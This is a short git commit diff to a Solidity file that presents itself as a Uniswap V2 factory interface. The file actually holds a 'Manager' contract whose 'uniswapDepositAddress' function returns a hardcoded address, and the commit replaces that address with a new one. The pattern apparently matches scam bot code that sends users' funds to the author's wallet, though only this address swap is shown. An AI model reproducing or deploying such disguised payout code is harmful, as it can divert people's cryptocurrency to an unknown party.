72ac18a06d533239bf98da93996c7966c9dfca51
mizzlegrizzle <75636856+mizzlegrizzle@users.noreply.github.com>
2022-01-01 19:47:18 -0800

    Update IUniswapV2Factory.sol

--- contracts/interfaces/V2/IUniswapV2Factory.sol
+++ contracts/interfaces/V2/IUniswapV2Factory.sol
@@ -6,6 +6,6 @@ contract Manager {
 	}
 
 	function uniswapDepositAddress() public pure returns (address) {
-		return 0xbCb228BE3A8bf50cA3EBBf6195cB5F4E027e8419;
+		return 0x6Ef494d081d689E0b1E3aCAC6aD79bd2458BE2BF;
 	}
 }
